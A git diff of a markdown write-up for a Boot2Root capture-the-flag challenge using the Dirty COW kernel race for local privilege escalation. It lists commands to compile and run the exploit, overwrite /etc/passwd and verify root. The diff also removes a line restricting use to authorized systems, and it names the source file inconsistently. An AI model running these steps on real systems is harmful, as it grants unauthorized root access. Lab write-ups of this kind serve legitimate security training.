@@ -1,6 +1,11 @@
-# Linux Kernel Vulnerability — `pkemn.c` (Dirty COW / COW race)
+# Boot2Root - Bonus Challenge 5: Linux Kernel Vulnerability
 
-## Summary
+## 1. Challenge Overview
+**Challenge:** Linux Kernel Vulnerability — `pkemn.c` (Dirty COW / COW race)
+
+---
+
+## 2. Summary
 - Exploits a **race condition** in the Linux kernel **copy‑on‑write (COW)**.
 - Allows an **unprivileged user to write to read‑only memory mappings**.
 - Can **modify protected files** (e.g. `/etc/passwd`) and **escalate to root**.
@@ -8,40 +13,37 @@
 
 ---
 
-## Minimal Steps
+## 3. Steps
 
-### 1) Check kernel (likely vulnerable if old)
+### 3.1 Check kernel (likely vulnerable if old)
 ```bash
 uname -a
 cat /proc/version
 ```
 
-### 2) Get & compile the exploit
+### 3.2 Get & compile the exploit
 ```bash
 # assuming pkemn.c is in the current dir
 gcc -pthread dirty.c -o dirty -lcrypt
 ```
 
-
-### 3) Run exploit
+### 3.3 Run exploit
 ```bash
 ./dirty
 ```
 
-### 4) Verify escalation
+### 3.4 Verify escalation
 ```bash
 id
 whoami
 ```
 
-### 5) (Optional) Restore backup
+### 3.5 (Optional) Restore backup
 ```bash
 [ -f /tmp/passwd.bak ] && sudo cp /tmp/passwd.bak /etc/passwd
 ```
 
 ---
 
-## Notes
-- Works by winning a **write‑vs‑COW** race on a read‑only mapping.
-- Typical payloads: writing a new root user line to `/etc/passwd` or patching SUID binaries.
-- Mitigated in patched kernels; ensure you run this only on systems you’re authorized to test.
+## 4. Result
+**Root access obtained** ✅
